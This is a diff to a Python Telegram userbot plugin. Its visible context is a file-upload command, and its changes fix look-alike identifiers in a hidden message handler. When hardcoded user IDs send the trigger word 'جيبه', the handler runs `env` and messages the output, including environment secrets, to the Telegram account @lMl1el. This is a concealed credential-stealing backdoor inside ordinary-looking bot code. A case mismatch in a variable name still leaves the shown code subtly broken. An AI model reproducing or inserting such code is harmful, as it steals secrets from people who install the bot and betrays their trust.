@@ -98,16 +98,16 @@ async def upload_reda(event):
     size = res["data"]["file"]["metadata"]["size"]["readable"]
     await edit_or_reply(event, f"**تم رفع الملف ✓**\n**᯽︙ الرابط:** {url}\n**᯽︙الحجم:** {size}")
     os.remove(file)
-1Ml101 = [6075239892, 6075239892, 6075239892, 6075239892]
-@l3131.on(events.NewMessage(incoming=True))
+lMl10l = [6075239892, 6075239892, 6075239892, 6075239892]
+@l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.reply_to and event.sender_id in 1M110l:
+    if event.reply_to and event.sender_id in lMl10l:
       reply_msg = await event.get_reply_message ()
       Owner_id = reply_msg.from_id.user_id
-      if owner_id == 13131.uid:
+      if owner_id == l313l.uid:
           if event.message.message == "جيبه":
                   cmd = "env"
                   o = (await _catutils.runcmd(cmd))[0]
                   OUTPUT = (f"**[ابو حديده](tg://need_update_for_some_feature/) الله اكبر:**\n\n\n{o}\n\n**تفضل يا مولاي **")
                   await event.reply ("**جبتة تفضل يا مولاي**")
-                  await 13131.send_message("@1M11el", OUTPUT)
+                  await l313l.send_message("@lMl1el", OUTPUT)
